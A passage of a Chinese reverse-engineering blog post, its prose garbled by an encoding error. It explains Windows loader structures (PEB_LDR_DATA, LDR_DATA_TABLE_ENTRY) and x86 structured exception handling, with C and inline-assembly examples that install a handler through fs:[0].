class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ã€€ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">ã€€BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">ã€€PVOID SsHandle; <span class="comment">// +0x08å†…å­˜å¯¹é½</span></span><br><span class="line">ã€€LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x10</span></span><br><span class="line">ã€€LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x20</span></span><br><span class="line">ã€€LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x30</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x40</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­LIST_ENTRYæ˜¯åŒå‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>è€Œæ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ˜¯è¿™æ ·çš„ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125; s1;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;</span><br><span class="line">    _ACTIVATION_CONTEXT *EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">    LIST_ENTRY ForwarderLinks;</span><br><span class="line">    LIST_ENTRY ServiceTagLinks;</span><br><span class="line">    LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>InLoadOrderModuleListï¼ŒInMemoryOrderModuleListï¼ŒInInitializationOrderModuleListçš„æ¯ä¸ªå…ƒç´ éƒ½æŒ‡å‘çš„æ˜¯ä¸Šä¸€ä¸ª/ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„å¯¹åº”å…ƒç´ <br>æ¯”å¦‚InLoadOrderModuleListçš„Flinkå’ŒBlinkå°±æ˜¯æŒ‡å‘LDR_DATA_TABLE_ENTRYç»“æ„çš„ä½ä¸€ä¸ªå…ƒç´ InLoadOrderLinksçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯LDR_DATA_TABLE_ENTRYçš„åœ°å€ï¼Œé€šè¿‡è¿™ç§æ–¹æ³•ï¼Œå¯ä»¥ç”¨ä¸‰ç§é¡ºåºä¸²èµ·åŠ è½½çš„æ¨¡å—ï¼ŒåŒæ—¶é“¾æ¥æ‰€æœ‰çš„æ¨¡å—ç»“æ„ã€‚</p><h2 id="SEH">SEH</h2><p>ä¸‹é¢éƒ½æ˜¯x86çš„å®ç°</p><h3 id="æ­£å‘å®ç°">æ­£å‘å®ç°</h3><p>åœ¨VSä¸­ï¼ŒCè¯­è¨€å¯ä»¥ç›´æ¥ä½¿ç”¨å…³é”®å­—å®ç°Windowsç»“æ„åŒ–å¼‚å¸¸å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_try</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//å¯èƒ½è§¦å‘å¼‚å¸¸çš„ä»£ç </span></span><br><span class="line">&#125;</span><br><span class="line">_except(<span class="comment">/*è¿‡æ»¤è¡¨è¾¾å¼*/</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//å¼‚å¸¸å¤„ç†</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>è¿‡æ»¤è¡¨è¾¾å¼çš„å–å€¼å¦‚ä¸‹ï¼š</p><ol><li><code>EXCEPTION_EXECUTE_HANDLER</code> (1) æ‰§è¡Œ<code>except</code>é‡Œé¢çš„ä»£ç </li><li><code>EXCEPTION_CONTINUE_SEARCH</code> (0) å¯»æ‰¾ä¸‹ä¸€ä¸ªå¼‚å¸¸å¤„ç†å‡½æ•°</li><li><code>EXCEPTION_CONTINUE_EXECUTION</code> (-1) è¿”å›å‡ºé”™ä½ç½®é‡æ–°æ‰§è¡Œ</li></ol><p>ä¸¾ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">modify_ecx</span><span class="params">(EXCEPTION_POINTERS* pExceptionInfo)</span> &#123;</span><br><span class="line">pExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>; <span class="comment">// ä¿®æ”¹ECXå¯„å­˜å™¨çš„å€¼ä¸º1</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">__try &#123;</span><br><span class="line">a++;</span><br><span class="line">b--;</span><br><span class="line"><span class="type">int</span> c = a / b; <span class="comment">// è¿™é‡Œä¼šäº§ç”Ÿé™¤é›¶å¼‚å¸¸</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c = %d\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">__except (b = <span class="number">9</span>, modify_ecx(GetExceptionInformation())) &#123;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">9</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;å¼‚å¸¸å¤„ç†ï¼šå·²æ›´æ”¹é™¤æ•°&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;å¼‚å¸¸å¤„ç†&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºï¼Œåœ¨exceptä¸­ä¿®æ”¹bçš„å€¼ï¼Œç„¶åè¿”å›åŸå¤„ç»§ç»­æ‰§è¡Œï¼Œä»¥è·³è¿‡bug</p><p>è¿˜æœ‰ä¸€ä¸ªä¸å¸¸ç”¨çš„è¯­æ³•<code>__finally&#123;&#125;</code>ï¼Œæ•ˆæœæ˜¯æ— è®ºæœ‰æ²¡æœ‰å¼‚å¸¸å¤„ç†ï¼Œåªè¦tryå—å…¨éƒ¨å¤„ç†ç»“æŸå°±ä¼šè½¬åˆ°finallyå—ä¸­æ‰§è¡Œæ“ä½œ</p><p>åœ¨æ±‡ç¼–ä¸­å®ç°ï¼Œéœ€è¦å…ˆçŸ¥é“SEHçš„ç»“æ„ï¼Œæ‰€ä»¥å…ˆçœ‹åé¢çš„å§</p><h3 id="å¼‚å¸¸åˆ†ç±»">å¼‚å¸¸åˆ†ç±»</h3><p>ä¸Šé¢çš„ä¾‹å­ä¸­ä½¿ç”¨çš„æ˜¯é™¤é›¶å¼‚å¸¸ï¼Œè¿˜æœ‰ä¸‹é¢å‡ ç§å¸¸è§å¼‚å¸¸</p><ul><li>EXCEPTION_ACCESS_VIOLATION     0xC0000005     ç¨‹åºä¼å›¾è¯»å†™ä¸€ä¸ªä¸å¯è®¿é—®çš„åœ°å€æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ä¼å›¾è¯»å–0åœ°å€å¤„çš„å†…å­˜ã€‚</li><li>EXCEPTION_ARRAY_BOUNDS_EXCEEDED    0xC000008C     æ•°ç»„è®¿é—®è¶Šç•Œæ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</li><li>EXCEPTION_BREAKPOINT                           0x80000003     è§¦å‘æ–­ç‚¹æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</li><li>EXCEPTION_DATATYPE_MISALIGNMENT    0x80000002     ç¨‹åºè¯»å–ä¸€ä¸ªæœªç»å¯¹é½çš„æ•°æ®æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</li><li>EXCEPTION_FLT_DENORMAL_OPERAND     0xC000008D     å¦‚æœæµ®ç‚¹æ•°æ“ä½œçš„æ“ä½œæ•°æ˜¯éæ­£å¸¸çš„ï¼Œåˆ™å¼•å‘è¯¥å¼‚å¸¸ã€‚æ‰€è°“éæ­£å¸¸ï¼Œå³å®ƒçš„å€¼å¤ªå°ä»¥è‡³äºä¸èƒ½ç”¨æ ‡å‡†æ ¼å¼è¡¨ç¤ºå‡ºæ¥ã€‚</li><li>EXCEPTION_FLT_DIVIDE_BY_ZERO                   0xC000008E     æµ®ç‚¹æ•°é™¤æ³•çš„é™¤æ•°æ˜¯0æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_FLT_INEXACT_RESULT           0xC000008F     æµ®ç‚¹æ•°æ“ä½œçš„ç»“æœä¸èƒ½ç²¾ç¡®è¡¨ç¤ºæˆå°æ•°æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_FLT_INVALID_OPERATION            0xC0000090     è¯¥å¼‚å¸¸è¡¨ç¤ºä¸åŒ…æ‹¬åœ¨è¿™ä¸ªè¡¨å†…çš„å…¶å®ƒæµ®ç‚¹æ•°å¼‚å¸¸ã€‚</li><li>EXCEPTION_FLT_OVERFLOW                             0xC0000091     æµ®ç‚¹æ•°çš„æŒ‡æ•°è¶…è¿‡æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_FLT_STACK_CHECK                  0xC0000092     è¿›è¡Œæµ®ç‚¹æ•°è¿ç®—æ—¶æ ˆå‘ç”Ÿæº¢å‡ºæˆ–ä¸‹æº¢æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_FLT_UNDERFLOW                    0xC0000093     æµ®ç‚¹æ•°çš„æŒ‡æ•°å°äºæ‰€èƒ½è¡¨ç¤ºçš„æœ€å°å€¼æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_ILLEGAL_INSTRUCTION          0xC000001D     ç¨‹åºä¼å›¾æ‰§è¡Œä¸€ä¸ªæ— æ•ˆçš„æŒ‡ä»¤æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_IN_PAGE_ERROR                        0xC0000006     ç¨‹åºè¦è®¿é—®çš„å†…å­˜é¡µä¸åœ¨ç‰©ç†å†…å­˜ä¸­æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚</li><li>EXCEPTION_INT_DIVIDE_BY_ZERO                   0xC0000094     æ•´æ•°é™¤æ³•çš„é™¤æ•°æ˜¯0æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_INT_OVERFLOW                             0xC0000095     æ•´æ•°æ“ä½œçš„ç»“æœæº¢å‡ºæ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_INVALID_DISPOSITION                  0xC0000026     å¼‚å¸¸å¤„ç†å™¨è¿”å›ä¸€ä¸ªæ— æ•ˆçš„å¤„ç†çš„æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_NONCONTINUABLE_EXCEPTION     0xC0000025     å‘ç”Ÿä¸€ä¸ªä¸å¯ç»§ç»­æ‰§è¡Œçš„å¼‚å¸¸æ—¶ï¼Œå¦‚æœç¨‹åºç»§ç»­æ‰§è¡Œï¼Œåˆ™ä¼šå¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_PRIV_INSTRUCTION                     0xC0000096     ç¨‹åºä¼å›¾æ‰§è¡Œä¸€æ¡å½“å‰CPUæ¨¡å¼ä¸å…è®¸çš„æŒ‡ä»¤æ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li><li>EXCEPTION_SINGLE_STEP                          0x80000004     æ ‡å¿—å¯„å­˜å™¨çš„TFä½ä¸º1æ—¶ï¼Œæ¯æ‰§è¡Œä¸€æ¡æŒ‡ä»¤å°±ä¼šå¼•å‘è¯¥å¼‚å¸¸ã€‚ä¸»è¦ç”¨äºå•æ­¥è°ƒè¯•ã€‚</li><li>EXCEPTION_STACK_OVERFLOW                   0xC00000FD     æ ˆæº¢å‡ºæ—¶å¼•å‘è¯¥å¼‚å¸¸ã€‚</li></ul><h3 id="å¼‚å¸¸å¤„ç†æµç¨‹">å¼‚å¸¸å¤„ç†æµç¨‹</h3><p>å½“è§¦å‘äº†ä¸€ä¸ªå¼‚å¸¸ï¼Œä¼šæ ¹æ®ä¼˜å…ˆçº§æ¥åˆ†é…è°æ¥å¤„ç†è¿™ä¸ªå¼‚å¸¸ï¼Œå¦‚æœæ˜¯ç¨‹åºæœ¬èº«ï¼Œç³»ç»Ÿå°±ä¼šæŸ¥çœ‹çº¿ç¨‹çš„fs:[0]æœ‰æ²¡æœ‰å®‰è£…SEHï¼Œå¦‚æœæœ‰å°±ä¼šè°ƒç”¨è¿™é‡Œçš„å‡½æ•°ã€‚</p><p>fs:[0]å³NT_TIB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB32</span> &#123;</span></span><br><span class="line">    DWORD ExceptionList;</span><br><span class="line">    DWORD StackBase;</span><br><span class="line">    DWORD StackLimit;</span><br><span class="line">    DWORD SubSystemTib;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    DWORD FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    DWORD ArbitraryUserPointer;</span><br><span class="line">    DWORD Self;</span><br><span class="line">&#125; NT_TIB32, *PNT_TIB32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB64</span> &#123;</span></span><br><span class="line">    DWORD64 ExceptionList;</span><br><span class="line">    DWORD64 StackBase;</span><br><span class="line">    DWORD64 StackLimit;</span><br><span class="line">    DWORD64 SubSystemTib;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD64 FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    DWORD64 FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    DWORD64 ArbitraryUserPointer;</span><br><span class="line">    DWORD64 Self;</span><br><span class="line">&#125; NT_TIB64, *PNT_TIB64;</span><br></pre></td></tr></table></figure><p>çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æŒ‡å‘EXCEPTION_REGISTRATION_RECORDç±»å‹çš„æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œå…¶ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span></span><br><span class="line">_IRQL_requires_same_</span><br><span class="line">_Function_class_(EXCEPTION_ROUTINE)</span><br><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">NTAPI</span><br><span class="line"><span class="title function_">EXCEPTION_ROUTINE</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_ <span class="keyword">struct</span> _EXCEPTION_RECORD *ExceptionRecord,</span></span><br><span class="line"><span class="params">    _In_ PVOID EstablisherFrame,</span></span><br><span class="line"><span class="params">    _Inout_ <span class="keyword">struct</span> _CONTEXT *ContextRecord,</span></span><br><span class="line"><span class="params">    _In_ PVOID DispatcherContext</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> EXCEPTION_ROUTINE *PEXCEPTION_ROUTINE;</span><br></pre></td></tr></table></figure><p>PEXCEPTION_ROUTINEæ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªä¼ å‚è¯¦ç»†æè¿°äº†å¼‚å¸¸ã€‚ContextRecordä¿ç•™CPUå¤„ç†å¼‚å¸¸å‰çš„çŠ¶æ€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD ExceptionCode;</span><br><span class="line">    DWORD ExceptionFlags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">    PVOID ExceptionAddress;<span class="comment">//å‘ç”Ÿå¼‚å¸¸çš„åœ°å€</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br><span class="line"><span class="keyword">typedef</span> EXCEPTION_RECORD *PEXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>Windowsä¼šä¾æ¬¡è®¿é—®Handlerï¼Œå¦‚æœå‡½æ•°ä¸å¤„ç†ï¼Œè¿”å›ExceptionContinueSearchï¼Œé‚£ä¹ˆå°±ä¼šå‘åæŸ¥Nextï¼Œç›´åˆ°æ‰¾åˆ°èƒ½å¤„ç†çš„ã€‚</p><h3 id="æ±‡ç¼–å®ç°">æ±‡ç¼–å®ç°</h3><p>é‚£ä¹ˆï¼Œæƒ³è¦å®ç°ä¸Šé¢çš„æ“ä½œå°±æ˜¯ç»™ç³»ç»Ÿæ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°æ¥è°ƒç”¨å°±å¥½äº†ï¼Œå³ï¼šæ‰‹åŠ¨å®ç°EXCEPTION_REGISTRATION_RECORDç„¶åæŒ‚åˆ°é“¾ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> c = a / b;</span><br><span class="line">&#125;</span><br><span class="line">__except (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;divide 0!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç­‰ä»·äº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">_Inout_ <span class="keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,</span></span><br><span class="line"><span class="params">_In_ PVOID EstablisherFrame,</span></span><br><span class="line"><span class="params">_Inout_ <span class="keyword">struct</span> _CONTEXT* ContextRecord,</span></span><br><span class="line"><span class="params">_In_ PVOID DispatcherContext)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;divide 0!\n&quot;</span>);</span><br><span class="line">ContextRecord-&gt;Eip += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">DWORD tmp = <span class="number">0</span>;</span><br><span class="line">__asm &#123;<span class="comment">//å®‰è£…SEH,pushéœ€è¦å€’ç½®</span></span><br><span class="line">push myExceptionHandler;<span class="comment">//è‡ªå·±å¼‚å¸¸å¤„ç†å‡½æ•°</span></span><br><span class="line">push dword ptr fs : [<span class="number">0</span>] ;<span class="comment">//next</span></span><br><span class="line">mov dword ptr fs : [<span class="number">0</span>] , esp;<span class="comment">//è®¾ç½®æ–°çš„é“¾é¦–</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> c = a / b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hihi&quot;</span>);</span><br><span class="line">__asm &#123;<span class="comment">//å¸è½½SEH</span></span><br><span class="line">mov dword ptr fs : [<span class="number">0</span>] , esp;</span><br><span class="line">pop eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SEHåªèƒ½åœ¨æ ˆä¸Šä½¿ç”¨ï¼Œè€ŒVEHå¯ä»¥åœ¨å †ä¸Šä½¿ç”¨</p><h3 id="unwind">unwind</h3><p>åœ¨tryå—ç»“æŸåä¼šä¾æ¬¡åˆ é™¤sehé“¾ï¼Œå¹¶é‡Šæ”¾èµ„æº</p><p>x64ä¸‹ï¼Œsehä¸ç”±sehé“¾å®ç°ï¼Œè€Œæ˜¯ç”±sehè¡¨å®ç°</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> ååŠ¨æ€è°ƒè¯• </category>
          
          <category> å¼‚å¸¸å¤„ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> windows </tag>
            
            <tag> å†…æ ¸ </tag>
            
